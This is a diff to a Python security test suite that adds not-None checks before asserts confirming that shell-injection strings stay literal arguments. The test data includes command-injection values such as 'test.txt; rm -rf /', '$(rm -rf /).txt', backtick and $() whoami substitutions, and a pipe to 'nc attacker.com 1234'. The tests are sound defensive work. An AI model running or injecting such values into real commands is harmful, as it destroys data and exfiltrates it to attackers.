@@ -65,6 +65,7 @@ class TestCommandInjectionSecurity:
         executor._apply_basic_templating_to_config(config, malicious_context)
 
         # The malicious content should be treated as a literal argument
+        assert config.args is not None
         assert config.args[0] == "test.txt; rm -rf /"
 
         # Build command args - should be a list, not a string
@@ -167,6 +168,7 @@ class TestCommandInjectionSecurity:
         executor._apply_basic_templating_to_config(config, malicious_context)
 
         # Backticks should be treated as literal characters
+        assert config.args is not None
         assert config.args[0] == "`whoami`.txt"
 
     def test_dollar_command_substitution_blocked(self, executor):
@@ -192,6 +194,7 @@ class TestCommandInjectionSecurity:
         executor._apply_basic_templating_to_config(config, malicious_context)
 
         # Should be treated as literal strings
+        assert config.args is not None
         assert config.args[0] == "$(rm -rf /).txt"
         assert config.args[1] == "test_$(whoami)"
 
@@ -218,6 +221,7 @@ class TestCommandInjectionSecurity:
         executor._apply_basic_templating_to_config(config, malicious_context)
 
         # Pipe should be literal, not interpreted
+        assert config.args is not None
         assert config.args[0] == "data.txt | nc attacker.com 1234"
 
         # Build the command
@@ -247,6 +251,7 @@ class TestCommandInjectionSecurity:
 
         # Null byte should be in the string (Python strings can contain null bytes)
         # The important thing is it's passed as a list element, not shell-interpreted
+        assert config.args is not None
         assert "\x00" in config.args[0]
 
     def test_newline_injection_blocked(self, executor):
@@ -269,6 +274,7 @@ class TestCommandInjectionSecurity:
         executor._apply_basic_templating_to_config(config, malicious_context)
 
         # Newline should be preserved as literal character
+        assert config.args is not None
         assert config.args[0] == "safe\nrm -rf /"
 
     def test_glob_patterns_not_expanded(self, executor):
@@ -291,6 +297,7 @@ class TestCommandInjectionSecurity:
         executor._apply_basic_templating_to_config(config, malicious_context)
 
         # Glob should be literal (not expanded since we don't use shell)
+        assert config.args is not None
         assert config.args[0] == "*.txt"
 
         command_list = executor._build_command_args(config, malicious_context)
@@ -316,6 +323,7 @@ class TestCommandInjectionSecurity:
         executor._apply_basic_templating_to_config(config, malicious_context)
 
         # Should be literal strings, not shell-expanded
+        assert config.args is not None
         assert config.args[0] == "$HOME/file"
         assert config.args[1] == "${PATH}/bin"
 
@@ -420,6 +428,7 @@ class TestCommandInjectionSecurity:
         executor._apply_basic_templating_to_config(config, malicious_context)
 
         # Should preserve the Unicode character
+        assert config.args is not None
         assert config.args[0] == "test;whoami"
 
         # Still safe because we use list form
@@ -540,6 +549,7 @@ class TestCommandInjectionSecurity:
         executor._apply_basic_templating_to_config(config, malicious_context)
 
         # The malicious content should be a single string argument
+        assert config.args is not None
         assert config.args[0] == '"] ; rm -rf / ; echo ["'
 
         command_list = executor._build_command_args(config, malicious_context)
